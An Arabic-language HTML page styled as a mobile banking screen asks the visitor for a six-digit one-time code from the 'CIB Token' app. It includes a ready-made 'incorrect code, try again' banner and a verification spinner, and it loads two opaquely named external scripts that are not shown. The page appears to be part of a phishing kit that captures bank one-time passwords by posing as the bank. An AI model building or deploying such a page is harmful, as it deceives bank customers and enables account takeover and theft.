<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
  <title>الرقم السري المتغير (OTP)</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet" />
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: 'Cairo', sans-serif;
      background: #f2f4f7;
      margin: 0;
      padding: 0;
      min-height: 100vh;
    }

    .phone-frame {
      width: 100%;
      max-width: 100vw;
      min-height: 100vh;
      background: #f2f4f7;
      display: flex;
      flex-direction: column;
      position: relative;
      overflow: hidden;
    }

    .header {
      background: #1a56a0;
      padding: 14px 20px;
      padding-top: calc(14px + env(safe-area-inset-top, 0px));
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
      min-height: 54px;
      width: 100%;
    }

    .header-title {
      color: #ffffff;
      font-size: 17px;
      font-weight: 700;
      font-family: 'Cairo', sans-serif;
      letter-spacing: 0.2px;
    }

    .close-btn {
      position: absolute;
      left: 18px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      color: #ffffff;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .close-btn svg { width: 22px; height: 22px; }

    .content {
      flex: 1;
      padding: 36px 24px 120px;
      display: flex;
      flex-direction: column;
      max-width: 480px;
      width: 100%;
      margin: 0 auto;
    }

    .bottom-action-btn {
      position: fixed;
      bottom: 0;
      left: 0;
      right: 0;
      padding: 16px 20px;
      padding-bottom: calc(16px + env(safe-area-inset-bottom, 0px));
      background: linear-gradient(180deg, rgba(242, 244, 247, 0) 0%, rgba(242, 244, 247, 1) 20%);
      display: flex;
      justify-content: center;
      z-index: 100;
    }

    .bottom-action-btn button {
      width: 100%;
      max-width: 440px;
      height: 52px;
      background: #1a56a0;
      color: #ffffff;
      border: none;
      border-radius: 12px;
      font-family: 'Cairo', sans-serif;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 4px 15px rgba(26, 86, 160, 0.35);
    }

    .bottom-action-btn button:hover {
      background: #154a8a;
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(26, 86, 160, 0.45);
    }

    .bottom-action-btn button:active {
      transform: translateY(0);
      box-shadow: 0 2px 10px rgba(26, 86, 160, 0.3);
    }

    /* تصميم متجاوب للشاشات الصغيرة */
    @media (max-width: 360px) {
      .bottom-action-btn button {
        max-width: calc(100% - 32px);
        font-size: 14px;
        height: 48px;
      }
    }

    @media (min-width: 391px) {
      .bottom-action-btn button {
        max-width: 370px;
      }
    }

    .section-title {
      font-size: 16px;
      font-weight: 700;
      color: #1a1a2e;
      text-align: right;
      margin-bottom: 10px;
      font-family: 'Cairo', sans-serif;
    }

    .section-desc {
      font-size: 13px;
      font-weight: 400;
      color: #555;
      text-align: right;
      line-height: 1.7;
      margin-bottom: 32px;
      font-family: 'Cairo', sans-serif;
    }

    .otp-container {
      display: flex;
      justify-content: center;
      gap: 10px;
      direction: ltr;
      margin-bottom: 40px;
    }

    .otp-box {
      width: 52px;
      height: 58px;
      border: 1.5px solid #d0d7e2;
      border-radius: 18px;
      background: #ffffff;
      font-size: 22px;
      font-weight: 700;
      text-align: center;
      color: #1a1a2e;
      font-family: 'Cairo', sans-serif;
      outline: none;
      transition: border-color 0.2s, box-shadow 0.2s;
      caret-color: #1a56a0;
    }

    .otp-box:focus {
      border-color: #1a56a0;
      box-shadow: 0 0 0 3px rgba(26, 86, 160, 0.13);
    }

    .otp-box.filled  { border-color: #1a56a0; }

    .otp-box.success {
      border-color: #27ae60;
      background: #f0fff4;
      box-shadow: 0 0 0 3px rgba(39, 174, 96, 0.15);
    }

    /* رسالة الخطأ */
    #decline-message {
      display: none;
      background: linear-gradient(135deg, #ff6b6b, #ee5a6f);
      border-radius: 12px;
      padding: 14px 16px;
      margin-bottom: 16px;
      box-shadow: 0 4px 15px rgba(238,90,111,0.3);
      animation: slideDown 0.3s ease-out;
    }

    @keyframes slideDown {
      from { opacity: 0; transform: translateY(-10px); }
      to   { opacity: 1; transform: translateY(0); }
    }

    #loadingOverlay {
      display: none;
      position: absolute;
      inset: 0;
      background: rgba(255, 255, 255, 0.75);
      justify-content: center;
      align-items: center;
      flex-direction: column;
      z-index: 10;
    }

    #loadingOverlay.active { display: flex; }

    .spinner {
      width: 40px;
      height: 40px;
      border: 4px solid #d0d7e2;
      border-top-color: #1a56a0;
      border-radius: 50%;
      animation: spin 0.7s linear infinite;
    }

    #loadingOverlay h5 { color: #1a1a2e; margin-top: 14px; font-size: 15px; font-family: 'Cairo', sans-serif; }
    #loadingOverlay p  { color: #666; font-size: 13px; font-family: 'Cairo', sans-serif; }

    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="phone-frame">

    <div id="loadingOverlay">
      <div class="spinner"></div>
      <h5>جاري التحقق...</h5>
      <p>يرجى الانتظار</p>
    </div>

    <div class="header">
      <div class="header-title">الرقم السري المتغيّر (OTP)</div>
      <button class="close-btn" aria-label="إغلاق">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
          <line x1="18" y1="6" x2="6" y2="18"/>
          <line x1="6" y1="6" x2="18" y2="18"/>
        </svg>
      </button>
    </div>

    <div class="content">
      <div class="section-title">أدخل الرقم السري المتغيّر (OTP)</div>
      <div class="section-desc">برجاء إدخال الرقم السري المتغير OTP الذي تم إنشائه من خلال تطبيق الرقم السري المتغير</div>

      <div id="decline-message">
        <div style="display:flex;align-items:center;gap:12px;">
          <div style="width:42px;height:42px;background:rgba(255,255,255,0.25);border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
              <circle cx="12" cy="12" r="10"/>
              <line x1="12" y1="8" x2="12" y2="12"/>
              <line x1="12" y1="16" x2="12.01" y2="16"/>
            </svg>
          </div>
          <div style="flex:1;text-align:right;">
            <div style="color:white;font-size:15px;font-weight:600;margin-bottom:4px;">رمز التحقق غير صحيح</div>
            <div style="color:rgba(255,255,255,0.9);font-size:13px;line-height:1.5;">يرجى التحقق من الرمز الذي تم انشائه في داخل تطبيق CIB Token وإعادة المحاولة</div>
          </div>
        </div>
      </div>

      <div class="otp-container">
        <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" autocomplete="off" />
        <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" autocomplete="off" />
        <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" autocomplete="off" />
        <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" autocomplete="off" />
        <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" autocomplete="off" />
        <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" autocomplete="off" />
      </div>
    </div>


    <div class="bottom-action-btn">
      <button id="useOtpAppBtn">استخدم تطبيق الرقم السري المتغير OTP</button>
    </div>

  </div>

  <script src="js/a3.js"></script>
  <script src="js/kn5k.js"></script>
</body>
</html>
